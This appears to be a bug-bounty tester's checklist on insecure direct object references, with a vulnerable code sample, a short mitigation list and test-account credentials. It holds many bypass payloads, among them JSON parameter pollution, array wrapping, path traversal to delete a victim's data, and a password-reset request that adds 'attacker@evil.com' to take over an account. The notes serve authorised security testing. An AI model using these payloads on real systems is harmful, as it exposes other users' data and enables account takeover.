# Insecure Direct Object References (IDOR)

[#CWE-639](app://obsidian.md/index.html#CWE-639): Authorization Bypass Through User-Controlled Key

### What is the IDOR

#### 1. اي هي الـ vulnerability

(**IDOR**) occur when an application uses user-supplied input to access objects directly ==without proper access control checks==\
**Vulnerable Code:**

```
// Vulnerable code: No access control check
public ActionResult ViewOrder(int orderId)
{
    var order = db.Orders.Find(orderId);
    return View(order);
}
```

### Approach for Testing IDOR

> \[!Tip] Tip لو ريكوست مفيش `IDs` يبقي كدا بيغير نفسه\
> و امتي تنسخ ال **Authorazion** ؟ لو في `Id` في الرسكويت

> \[!Tip] Pro **Pro Tip:**
>
> 1. **Identify Authentication Methods:** Make sure to capture the session cookie, authorization header, or any other form of authentication used in requests.
> 2. **Use Auth-Analyzer in Burp Suite:** Pass these authentication tokens to the Auth-Analyzer Burp extension. This tool will replay all requests with the captured session information.
> 3. **Test with Another User:** Log in as a different user and activate the Auth-Analyzer extension. If you see the `SAME` tag in the extension results, this could indicate an IDOR vulnerability.
> 4. **Manual Verification:** Always manually check the request to confirm whether the vulnerability is genuine.
> 5. **Assess ID Predictability:** Determine if the IDs are predictable. If they aren't, investigate where they might be leaked, such as in other API responses. This could help in further exploitation or verification of the vulnerability

1. **Identify User-Controlled Parameters**
   * [ ] Find and Replace **`IDs`** **in URLs, header and body: /users/01 -> /users/02**(e.g., `user_id`, `file_id`, etc.).
   * [ ] Look for identifiers exposed in client-side code or API responses
     * [ ] _**2.Test Parameter Manipulation**_
   * [ ] **Try** Parameter Pollution: `users=01` **->** `users=01&users=02`
   * [ ] -Add as an array -> `?id[]=1&id[]=2`
   * [ ] Special Characters (Wildcard): `/users/01* or /users/*` **->** `Disclosure of every single user`
   * [ ] Try Older version of api endpoint: /api/v3/users/01 **->** /api/v1/users/02 , etc.....
   * [ ] add extension: `/users/01` \*\*-> `/users/02.json/XML`
   * [ ] Change Request Methods `POST /users/01` **->** `GET, PUT, PATCH, DELETE` etc...
   * [ ] Check if the Referrer or some other Headers are used to validate the `IDs`
   * [ ] \==`GET /users/02` **->** `403 Forbidden`==
   * [ ] \==`Referer: example.com/usser/01`==
   * [ ] \==`GET /users/02` **-> 200** \`OK!
   * [ ] \==`Referer: example.com/usser/02`==
   * [ ] change file type

```json
GET /user_data/2341        -> 401 
GET /user_data/2341.json   -> 200
GET /user_data/2341.xml    -> 200 
GET /user_data/2341.config -> 200
GET /user_data/2341.txt    -> 200
```

Encrypted IDs if application using encrypted IDs , try to decrypt using [**hashes.com**](https://hashes.com/en/decrypt/hash) **or other tools**

* [ ] JSON parameter pollution

```json
{"userid":1234,"userid":2542}
```

```json
[
    {"emailAddress": "Hacktoor@bugcrowdninja.com"},
    {"emailAddress": "0d3026ff11@bugcrowdninja.com"}
]

{"emailAddress":["Hacktoor@bugcrowdninja.com","Hacktoor@bugcrowdninja.com"]}
```

* [ ] Wrap the ID with an array in the body

```json
{"userid":123}   -> 401
{"userid":[123]} -> 200
```

* [ ] wrap the id with a json object

```json
{"userid":123}            -> 401
{"userid":{"userid":123}} -> 200
```

* [ ] If the website using graphql, try to find IDOR using graphql!
* [ ] Try decode the ID, if the ID encoded using md5,base64,etc
* [ ] Path Traversal

```json
POST /users/delete/victim_id          -> 403
POST /users/delete/my_id/..victim_id  -> 200
```

* [ ] change request content-type

```http
Content-Type: application/xml ->
Content-Type: application/json
```

* [ ] Missing Function Level Access Control

```json
GET /admin/profile ->401
GET /Admin/profile ->200
GET /ADMIN/profile ->200
GET /aDmin/profile ->200
GET /adMin/profile ->200
GET /admIn/profile ->200
GET /admiN/profile ->200
```

* \[ ]
* Swap `GUID` `With Numeric` `ID` `or` `email:`\
  [uuidtools](https://www.uuidtools.com/decode)
  * `/users/1b04c123-89f2-241s-b15b-e15641384h25` **->** `/users/02 or /users/a@b.com`
* Try GUIDs such as: !\[\[Pasted image 20250104165239.png]] !\[\[image.avif]]
  * 00000000-0000-0000-0000-000000000000 and 11111111-1111-1111-1111-1111111111111111
  * GUID Enumeration: try to disclose GUIDs using `Google Dorks,Github,wayback,Burp,History`
  * if none of the GUID Enumeration methods work then try: `SignUp, Reset Password,Other endpoints`within the application and analyze the response
  * `403/401` `Bypass:` if server responds back with a `403/401` then try ti use burp intruder and send 50-100 requests having different IDs: Ex: from `/users/01 to /users/100`\
    Bild IDORs L Sometimes information is not directly disclosed, Lookout for endpoint and features that may disclose information such as export files, emails or message alerts.
* Chain IDOR with XSS for Account Takeovers\
  **3.Test with Different User Roles**\
  Use accounts with different privilege levels (e.g., admin, regular user, guest) to test if object references can be used to escalate privileges.\
  **Accounts**
  1. User:[h3cktor+attacker@wearehackerone.com](mailto:h3cktor+attacker@wearehackerone.com)\
     pass:123456789@h3ckt0r
  2. User:[h3cktor+victm@wearehackerone.com](mailto:h3cktor+victm@wearehackerone.com)\
     pass:123456789@h3ckt0r

### Test Cases Scenarios

`GET /api/invoice?id=1000 HTTP/1.1` -> 403 Forbidden

Try to add the id in array With other methods like POST,PUT,DELETE, etc...\
EX:-\
`POST /api/invoice?id=1000 HTTP/1.1`\
`Host: example.com`\
`Content-Type:application/json`\
`{"invoice":"1000","user":"1337"}` -> ==200 OK!==\
try again send\
`GET /api/invoice?id=1000 HTTP/1.1` -> ==200 OK!==

#### IDOR with Geolocation data not stripped from images

Tools Used: exiftool Step1: Use 2 accounts in two browser Download images from here [https://github.com/ianare/exif-samples/tree/master/jpg/gps](https://github.com/ianare/exif-samples/tree/master/jpg/gps)

1. In **==1st==** account in network user can upload files just ==upload the image== their and ==open image link in new tab.==
2. In ==**second**== account do same things and that url like down
3. Change ==1st== account Url parameter value to 2nd acoount Url parameter
4. now image will shows up copy that url again and paste it to image data retrival website

#### Ability to reset password for account

POST [https://hq.breadcrumb.com/api/v1/password\_reset](https://hq.breadcrumb.com/api/v1/password_reset) HTTP/1.1 with body like 1.handel the mail and array

```json
{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
```

## mitigation

* Always verify that the user is authorized to access or modify the object.
* Use session or JWT tokens to determine the current user instead of relying on user-controlled parameters.
* Avoid Exposing Identifiers in URLs

## Bypassing
